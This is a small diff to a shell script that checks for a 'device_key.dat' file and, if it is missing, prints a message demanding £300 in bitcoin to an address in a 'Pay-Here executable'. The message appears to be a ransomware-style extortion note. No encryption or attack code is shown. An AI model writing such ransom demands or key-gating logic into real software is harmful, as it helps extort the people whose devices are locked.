@@ -2,7 +2,7 @@
 set -ue
 
 if [ ! -f device_key.dat ]; then
-  echo "device_key.dat not found. First pay for us!" >&2
+  echo -e "We have not yet recieved your payment! \n Please send £300 worth of bitcoin to the address in the Pay-Here executable" >&2
   exit 1
 fi
 
